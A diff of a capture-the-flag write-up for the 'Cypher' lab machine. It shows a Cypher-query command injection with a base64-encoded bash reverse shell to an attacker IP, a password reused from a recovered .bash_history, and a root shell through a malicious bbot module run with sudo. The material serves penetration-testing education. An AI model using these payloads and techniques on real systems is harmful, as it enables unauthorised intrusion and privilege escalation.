@@ -28,7 +28,7 @@ Cypher is focused on a cypher injection flaw granting a shell as neo4j. A histor
 
 ## Foothold
 <!-- Continue the writeup here -->
-We start by a scan for open ports : 
+We start by a scan for open ports using Nmap: 
 ```plaintext
 Nmap scan report for 10.10.11.57
 Host is up (0.12s latency).
@@ -90,13 +90,17 @@ testing                 [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 1
 ```
 We get an interesting directory, testing, upon visiting it, we end up with a jar file, that we download and decompile it for further information gathering.
 
+![testing endpoint](/assets/img/posts/cypher/testing.png)  
+_testing endpoint_  
+
+
 We download the [jd-gui decompiler](https://java-decompiler.github.io/ "Java Decompiler") for further analysis.      
 
 We open the jar file custom-apoc-extension-1.0-SNAPSHOT.jar :  
 ![JAR file structure](/assets/img/posts/cypher/java_decomp.png)  
 _JAR file structure_  
 
-Among these files, CustomFunctions catches our intention, we check its content, we get some important info, a command injection vulnerability in the getUrlStatusCode method!  
+Among these files, CustomFunctions catches our intention, we check its content, we get some important info, a command injection vulnerability in the getUrlStatusCode method! as there is no sanitization of url param, that is directly passed into sh -c command.
 
 ![Decompiled CustomFunctions.class](/assets/img/posts/cypher/decompiled.png)
 _Decompiled CustomFunctions.class_ 
@@ -138,7 +142,7 @@ Hence we can move on to calling getUrlStatusCode procedure, by cypher method CAL
 ```plaintext
 CALL custom.getUrlStatusCode(\"x; echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIyLzQ0NDQgMD4mMQo=|base64 -d | bash\")
 ```
-So we write some string in the url parameters followed  by a ; to end the dummy command, then we inject our reverse shell, so it's basically in base64, to be decoded and piped to bash to be executed.  
+So we write some string in the url parameters followed  by a ; to end the command, then we inject our reverse shell, so it's basically in base64, to be decoded and piped to bash to be executed.  
 
 (The reverse shell used for this) 
 ```bash
@@ -169,7 +173,7 @@ And we send the request with the crafted payload :
 _Malicious request_ 
 
 And we get our reverse shell as neo4j!  
-```bash
+```plaintext
 ➜  Cypher rlwrap nc -lvnp 4444
 Listening on 0.0.0.0 4444
 Connection received on 10.10.11.57 47566
@@ -178,7 +182,7 @@ bash: no job control in this shell
 neo4j@cypher:/$
 ```
 We list the users that might have shell access, also identify real login users (especially human users), since system/service accounts often use /usr/sbin/nologin or /bin/false. 
-```bash
+```plaintext
 neo4j@cypher:/$ cat /etc/passwd | grep 'bash'
 cat /etc/passwd | grep 'bash'
 root:x:0:0:root:/root:/bin/bash
@@ -188,7 +192,7 @@ neo4j:x:110:111:neo4j,,,:/var/lib/neo4j:/bin/bash
 So we have graphsm as another user, which is can be the real user we're searching for, we'll just dig in for more information that leads us to something.
 
 Upon moving the home directory of the user neo4j, and listing all its content, we get : 
-```bash
+```plaintext
 neo4j@cypher:~$ ls -la
 ls -la
 total 60
@@ -211,19 +215,22 @@ lrwxrwxrwx  1 neo4j adm      9 Oct  8  2024 .viminfo -> /dev/null
 ```
 First thing to notice, is that usually, .bash_history is redirected to /dev/null, which means it's always emptied, but in our case, there is still some history of runned commands, we read its content :  
 
-```bash
+```plaintext
 neo4j@cypher:~$ cat .bash_history
 cat .bash_history
 neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
 ```
 We get a password! First intuitive thing to try, is to login as graphasm with this password, password reuse is something common, so we try changing to this user locally, by :  
-```bash
+
+```plaintext
 neo4j@cypher:~$ su - graphasm
 su - graphasm
 Password: cU4btyib.20xtCMCXkBmerhK
 ```
-And it just hangs, so we try with ssh : 
-```bash 
+
+And it just hangs, which means it didn't work, so we try with ssh : 
+
+```plaintext 
 ➜  Cypher ssh graphasm@cypher.htb
 graphasm@cypher.htb's password:
 Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)
@@ -259,9 +266,148 @@ Last login: Fri Aug 1 22:27:37 2025 from 10.10.16.22
 graphasm@cypher:~$
 ```
 We're in as graphasm! Now we can read the user flag by :  
-```bash
+```plaintext
 graphasm@cypher:~$ cat user.txt
-14461f814cf14780fcec03fxxxxxxxxx
+f4a42dcd9e1749fc425da1f5xxxxxxxx
 ```
 
 ## Privilege escalation
+As we have graphsm password, first thing to check is to list the allowed sudo commands for the current user : 
+```plaintext
+graphasm@cypher:~$ sudo -l
+Matching Defaults entries for graphasm on cypher:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: /usr/local/bin/bbot
+```
+So we can run /usr/local/bin/bbot as root, so a potential privesc attack vector.  
+We see what bbot is, so we run :  
+```plaintext
+graphasm@cypher:~$ bbot --help
+  ______  _____   ____ _______
+ |  ___ \|  __ \ / __ \__   __|
+ | |___) | |__) | |  | | | |
+ |  ___ <|  __ <| |  | | | |
+ | |___) | |__) | |__| | | |
+ |______/|_____/ \____/  |_|
+ BIGHUGE BLS OSINT TOOL v2.1.0.4939rc
+
+www.blacklanternsecurity.com/bbot
+
+usage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]] [--strict-scope] [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo]
+            [-em MODULE [MODULE ...]] [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]] [--allow-deadly] [-n SCAN_NAME] [-v] [-d] [-s] [--force] [-y] [--dry-run] [--current-preset]
+            [--current-preset-full] [-o DIR] [-om MODULE [MODULE ...]] [--json] [--brief] [--event-types EVENT_TYPES [EVENT_TYPES ...]]
+            [--no-deps | --force-deps | --retry-deps | --ignore-failed-deps | --install-all-deps] [--version] [-H CUSTOM_HEADERS [CUSTOM_HEADERS ...]] [--custom-yara-rules CUSTOM_YARA_RULES]
+
+Bighuge BLS OSINT Tool
+```
+According to their Github repo : [https://github.com/blacklanternsecurity/bbot](https://github.com/blacklanternsecurity/bbot)  
+"BEE·bot is a multipurpose scanner inspired by Spiderfoot, built to automate your Recon, Bug Bounties, and ASM!"
+Used as a domain finder, web spider, email gatherer, web scanner, etc.
+
+A simple Google dorking for privesc exploits for the current version of bbot(v2.1.0), we find that there is an existing exploit :  
+![privesc exploit](/assets/img/posts/cypher/privesc.png)  
+_Privesc exploit google search_ 
+
+We enter the first link, we find the exploit, made by Huseyin Mardinli:  
+![privesc exploit steps](/assets/img/posts/cypher/steps.png)  
+_Privesc exploit steps_   
+
+We visit the exploit repo ([https://github.com/Housma/bbot-privesc](https://github.com/Housma/bbot-privesc)), and we try to understand how does the exploit work : 
+
+![privesc exploit steps](/assets/img/posts/cypher/exploit_content.png)  
+_Exploit content_
+
+So we have a python script, systeminfo_enum.py :
+```python 
+from bbot.modules.base import BaseModule
+import pty
+import os
+
+class systeminfo_enum(BaseModule):
+    watched_events = []
+    produced_events = []
+    flags = ["safe", "passive"]
+    meta = {"description": "System Info Recon (actually spawns root shell)"}
+
+    async def setup(self):
+        self.hugesuccess("📡 systeminfo_enum setup called — launching shell!")
+        try:
+            pty.spawn(["/bin/bash", "-p"])
+        except Exception as e:
+            self.error(f"❌ Shell failed: {e}")
+        return True
+```
+And a YAML file, preset.yml : 
+```yaml
+description: System Info Recon Scan
+module_dirs:
+  - .
+modules:
+  - systeminfo_enum
+```
+
+systeminfo_enum is a custom BBOT module that is meant for system information enumeration, marked as safe and passive to make the module appear harmless, it spawns a privileged bash (root shell), upon BBOT starts the scan via setup(), which executes automatically.
+
+We clone the repo locally as a zip, launch a local http server, and download the zip file into our box, in /tmp directory (it's emptied regularly, so we don't spoil other users of the machine :) ) 
+
+HTTP server launch : 
+```bash
+➜  Cypher python -m http.server 80 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+Exploit download : 
+```bash
+graphasm@cypher:/tmp$ curl http://10.10.16.22/bbot-privesc.zip -O bbot-privesc.zip 
+```
+
+Once we have the exploit, we unzip and cd into the exploit directory, we run with sudo : 
+```bash
+sudo /usr/local/bin/bbot -t dummy.com -p preset.yml --event-types ROOT
+```
+
+Didn't work out at first try : 
+```plaintext 
+graphasm@cypher:/tmp/bbot-privesc$ sudo /usr/local/bin/bbot -t dummy.com -p preset.yml --event-types ROOT
+  ______  _____   ____ _______
+ |  ___ \|  __ \ / __ \__   __|
+ | |___) | |__) | |  | | | |
+ |  ___ <|  __ <| |  | | | |
+ | |___) | |__) | |__| | | |
+ |______/|_____/ \____/  |_|
+ BIGHUGE BLS OSINT TOOL v2.1.0.4939rc
+
+www.blacklanternsecurity.com/bbot
+
+[WARN] Error parsing preset "preset.yml": Could not find preset at "preset.yml" - file does not exist. Use -lp to list available presets
+```
+
+I needed to provide the full path to the preset.yml : 
+```plaintext
+graphasm@cypher:/tmp/bbot-privesc$ sudo /usr/local/bin/bbot -t dummy.com -p /tmp/bbot-privesc/preset.yml --event-types ROOT
+  ______  _____   ____ _______
+ |  ___ \|  __ \ / __ \__   __|
+ | |___) | |__) | |  | | | |
+ |  ___ <|  __ <| |  | | | |
+ | |___) | |__) | |__| | | |
+ |______/|_____/ \____/  |_|
+ BIGHUGE BLS OSINT TOOL v2.1.0.4939rc
+
+www.blacklanternsecurity.com/bbot
+
+[INFO] Scan with 1 modules seeded with 1 targets (1 in whitelist)
+[INFO] Loaded 1/1 scan modules (systeminfo_enum)
+[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
+[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
+[SUCC] systeminfo_enum: 📡 systeminfo_enum setup called — launching shell!
+
+root@cypher:/tmp/bbot-privesc#
+```  
+Now we have a shell as root! 
+We read the root flag : 
+
+```plaintext 
+root@cypher:~# cat root.txt
+f79b5158d872d33946bba8dbxxxxxxxx
+```
